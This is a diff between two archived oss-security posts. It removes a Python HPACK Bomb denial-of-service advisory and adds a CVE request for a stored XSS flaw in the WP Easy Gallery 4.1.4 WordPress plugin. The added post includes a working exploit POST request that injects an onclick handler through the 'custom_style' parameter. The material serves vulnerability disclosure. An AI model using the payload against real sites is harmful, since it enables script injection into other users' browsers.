@@ -1,93 +1,62 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/08/04/3
-Message-Id: <A341696A-69DE-484C-93CB-746F1B01A924@lukasa.co.uk>
-Date: Thu, 4 Aug 2016 10:18:55 +0100
-From: Cory Benfield <cory@...asa.co.uk>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/01/26/4
+Message-ID: <CADLX=aHvwog3Ss3sVQVhoi-F1A46a2X+w687MCJ+q-5Z_kBUSA@mail.gmail.com>
+Date: Tue, 26 Jan 2016 15:29:35 +0530
+From: Rahul Pratap Singh <techno.rps@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE-2016-6581, Python HPACK and old Python Hyper releases: HPACK Bomb
+Subject: CVE Request: WP Easy Gallery v4.1.4 Stored XSS Vulnerability
 Content-Type: text/plain; charset=utf-8
 
-HPACK Bomb
-==========
+#Product    : WP Easy Gallery
+#Version    : 4.1.4
+#Home page Link  : https://wordpress.org/plugins/wp-easy-gallery
 
-Hyper Project security advisory, August 4th 2016.
+XSS Vulnerability:
 
-Vulnerability
--------------
+----------------------------------------
+Description:
+----------------------------------------
+"custom_style" parameter is not sanitized that leads to Stored XSS.
 
-A HTTP/2 implementation built using the priority library could be targetted for
-a denial of service attack based on HPACK, specifically a so-called "HPACK
-Bomb" attack.
+----------------------------------------
+Vulnerable Code:
+----------------------------------------
+File Name: wpeg-settings.php
 
-This attack occurs when an attacker inserts a header field that is exactly the
-size of the HPACK dynamic header table into the dynamic header table. The
-attacker can then send a header block that is simply repeated requests to
-expand that field in the dynamic table. This can lead to a gigantic compression
-ratio of 4,096 or better, meaning that 16kB of data can decompress to 64MB of
-data on the target machine.
+Found at line:12
+$temp_defaults['custom_style'] = isset($_POST['custom_style']) ?
+$_POST['custom_style'] : '';
 
-It only takes a few such header blocks before the attacker has forced the
-target to allocate gigabytes of memory, which will take the process down. This
-requires relatively few resources on the part of the attacker.
+Found at line:103
+<td><textarea name="custom_style" id="custom_style" rows="4"
+cols="40"><?php _e($default_options['custom_style']); ?></textarea></td>
 
-While we are not aware of any attacker actively exploiting this vulnerability,
-it has been public disclosed in this report[1], and so users should assume that
-they are likely to be targetted by such an attack.
+----------------------------------------
+Exploit:
+----------------------------------------
+POST /wp-admin/admin.php?page=wpeg-settings
 
-Info
-----
+wpeg_settings=3b59e6c6ef&_wp_http_referer=abc&display_mode=abc&num_columns=abc&show_gallery_name=abc&gallery_name_alignment=abc&use_default_style=abc&drop_shadow=abc&custom_style=</textarea><input+type%3Dtext+onclick%3Dalert(%2FXSS%2F)><!--&defaultSettings=xss&Submit=Save
 
-This issue has been given the name CVE-2016-6581.
+----------------------------------------
+POC:
+----------------------------------------
+https://0x62626262.files.wordpress.com/2016/01/easy-gallery-settingsxsspoc.png
 
-Affected Versions
------------------
+Fix:
+Update to 4.1.5
 
-This issue affects all versions of the HPACK library prior to 2.3.0. It also
-affects versions of the Hyper client library earlier than 0.6.0, which bundled
-a copy of the HPACK library.
+Disclosure Timeline:
+reported to wordpress  : 18/1/2016
+wordpress response (plugin taken down) : 19/1/2016
+vendor deployed a patch : 26/1/2016
 
-The Solution
-------------
+#######################################
+#        CTG SECURITY SOLUTIONS     #
+#        www.ctgsecuritysolutions.com    #
+#######################################
 
-In version 2.3.0, the HPACK library limits the maximum decompressed size of the
-header block. It does so by essentially adding support for the HTTP/2 setting
-``SETTINGS_MAX_HEADER_LIST_SIZE``. This value defaults to 64kB, but is
-user-configurable.
+Pub ref:
+https://0x62626262.wordpress.com/2016/01/26/wp-easy-gallery-v4-1-4-stored-xss-vulnerability/
+https://wordpress.org/plugins/wp-easy-gallery/changelog/
 
-If it is necessary to backport a patch, the patch can be found in
-this GitHub pull request[2].
-
-Recommendations
----------------
-
-We suggest you take the following actions immediately, in order of preference:
-
-1. Update HPACK to 2.3.0 immediately.
-2. Backport the patch made available on GitHub.
-3. Substantially decrease the maximum size of the compressed header block your
-   application will accept, or alternatively ensure that each decompressed
-   header block is freed before your application processes the next one.
-
-If you have a copy of the Hyper client library, we recommend taking the
-following actions, in order of preference:
-
-1. Update hyper to any version later than 0.6.0
-2. Backport the patch made available on GitHub.
-
-Timeline
---------
-
-This class of vulnerability was publicly reported in this report[1] on the
-3rd of August. We requested a CVE ID from Mitre the same day.
-
-HPACK 2.3.0 was released on the 4th of August, at the same time as the
-publication of this advisory.
-
-
-Thanks,
-
-Cory Benfield, on behalf of the Python Hyper project.
-
-
-[1]: http://www.imperva.com/docs/Imperva_HII_HTTP2.pdf
-[2]: https://github.com/python-hyper/hpack/pull/56
